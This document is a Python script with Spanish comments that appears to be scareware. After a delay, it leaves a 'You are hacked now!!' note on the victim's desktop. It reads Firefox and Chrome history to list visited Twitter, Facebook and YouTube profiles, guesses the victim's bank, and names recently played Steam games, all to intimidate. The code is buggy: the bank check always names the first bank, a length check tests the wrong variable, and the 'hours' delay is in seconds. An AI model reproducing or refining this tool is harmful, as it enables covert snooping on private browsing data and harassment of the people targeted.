import os
from time import sleep
from random import randrange
import sqlite3
import re
import glob
import shutil


TEXT_NAME = "LEEME.txt"
USER_PATH = os.getcwd()[0] + ":\\Users\\" + os.getlogin()
FIREFOX_HISTORY_PATH = USER_PATH + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ghbk2uxs.default-release\\places.sqlite"
CHROME_HISTORY_PATH = USER_PATH + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
STEAM_GAMES_PATH = os.getcwd()[0] + ":\\Program Files (x86)\\Steam\\steamapps\\common\\"


def delay_action():
    n_hours = randrange(1, 4) # randrange(1, 4) * 60 * 60 para sacar horas
    print("Delay de {} horas".format(n_hours))
    sleep(n_hours)


def create_file():
    desktop_path = USER_PATH + "\\Desktop\\"
    file = open(desktop_path + TEXT_NAME, mode="w")
    file.write("You are hacked now!! \n")
    file.close()
    return USER_PATH + "\\Desktop\\" + TEXT_NAME


def get_firefox_history():
    connection = sqlite3.connect(FIREFOX_HISTORY_PATH)
    cursor = connection.cursor()
    cursor.execute("SELECT title, url, last_visit_date FROM moz_places ORDER BY last_visit_date DESC ") #LIMIT 10
    urls = cursor.fetchall()
    connection.close()
    return urls


def get_chrome_history():
    temp_chrome_history = CHROME_HISTORY_PATH + "temp"
    shutil.copyfile(CHROME_HISTORY_PATH, temp_chrome_history)
    connection = sqlite3.connect(temp_chrome_history)
    cursor = connection.cursor()
    cursor.execute("SELECT title, url, last_visit_time FROM urls ORDER BY last_visit_time DESC ") # LIMIT 10
    urls = cursor.fetchall()
    connection.close()
    return urls


def try_firefox():
    while True:
        sleep(1)
    
        try:
            # print ("Historial de Firefox: \n", get_firefox_history())
            get_firefox_history()
            break

        except sqlite3.OperationalError: print("Ha ocurrido un error al obtener el historial de Firefox")
    
    return get_firefox_history()


def try_chrome():
    while True:
        sleep(1)
        try:
            # print ("Historial de Chrome: \n", get_chrome_history())
            get_chrome_history()
            break

        except sqlite3.OperationalError: print("Ha ocurrido un error al obtener el historial de Chrome")
    
    return get_chrome_history()


def check_twitter_and_scare(file, history):
    profiles_visited = []
    
    for url in history[:100]:
        results = re.findall("https://twitter.com/([A-Za-z0-9_]+)$", url[1])
    
        if results and results[0] not in ["notifications", "home"]: profiles_visited.append(results[0])
    
    if len(profiles_visited) == 0: pass

    else:
        with open(file, mode="a") as message:
            try: message.write("\nParece que haz husmeado en twitter los perfiles de: \n{}".format("\n - ".join(profiles_visited)))
            except UnicodeEncodeError: pass

def check_facebook_and_scare(file, history):
    profiles_visited = []
    
    for url in history[:100]:
        results = re.findall("https://www.facebook.com/([A-Za-z0-9_.]+)$", url[1])
        
        if results and results[0]: profiles_visited.append(results[0])
    

    if len(profiles_visited) == 0: pass

    else:
        with open(file, mode="a") as message:

            try: message.write("\nParece que haz stalkeado en Facebook los perfiles de los siguientes usuarios: \n - {}".format("\n - ".join(profiles_visited)))
            except UnicodeEncodeError: pass


def check_youtube_and_scare(file, history):
    channels_visited = []
    
    for url in history[:100]:
        
        results = re.findall(r"https://www.youtube.com/watch\?v=[&A-Za-z0-9&-_]+_channel=([&A-Za-z0-9&-_]+)$", url[1])

        if results: channels_visited.append(results[0])

    if len(channels_visited) > 0: 
        with open(file, mode="a") as message:
            try: message.write("\nParece que recientemente haz visto estos canales: \n - {}".format("\n - ".join(channels_visited)))
            except UnicodeEncodeError: pass
    
    else: pass


def check_bank_and_scare(file, history):
    his_bank = None
    banks = ["BBVA", "Santander", "HSBC", "Banjio", "IXE", "Inbursa", "Banamex", "NU", "Plata", "American Express", "DiDi", "Rappi"]

    for url in history[:100]:
        
        for bank in banks:
        
            if url[0] == None: pass
            else:
                bank.lower() in url[0].lower()
                his_bank = bank
                break
        
        if his_bank: break
    
    if his_bank == None: pass

    else:
        with open(file, mode="a") as message:
            try: message.write("\n Además he visto que tienes tu dinero en: {}".format(his_bank))
            except: pass

def check_steam_games(file):
    name_games = []
    game_paths = glob.glob(STEAM_GAMES_PATH + os.path.sep + "*")
    game_paths.sort(key=os.path.getatime)

    for game in game_paths:
        name_game = re.search(r".*\\([^\\]+)$", game)
        name_game = name_game.group(1)
        if name_game != "Steamworks Shared": name_games.append(name_game)
        else: pass

    if len(name_game) == 0: pass

    else:
        with open(file, mode="a") as message:
            try: message.write("\nParece que ultimamente haz jugado en Steam a: \n - {}".format("\n - ".join(name_games)))
            except EncodingWarning: pass

def main():
    
    delay_action() # Delay
    hacker_file = create_file() # Crear archivo
    
    if os.path.exists(FIREFOX_HISTORY_PATH):
        firefox_history = try_firefox() # Firefox
        #print(firefox_history)
        check_twitter_and_scare(hacker_file, firefox_history) # Check twitter user's search history
        check_facebook_and_scare(hacker_file, firefox_history) # Check facebook user's search history
        check_bank_and_scare(hacker_file, firefox_history) # Check user's history and check banks

    else: pass
    

    if os.path.exists(CHROME_HISTORY_PATH):
        chrome_history = try_chrome() # Chrome
        check_twitter_and_scare(hacker_file, chrome_history)
        check_youtube_and_scare(hacker_file, chrome_history)
        check_facebook_and_scare(hacker_file, chrome_history) # Check facebook user's search history
        check_bank_and_scare(hacker_file, chrome_history)
    else: pass

    if os.path.exists(STEAM_GAMES_PATH): check_steam_games(hacker_file)
    else: pass

if __name__ == "__main__":
    main()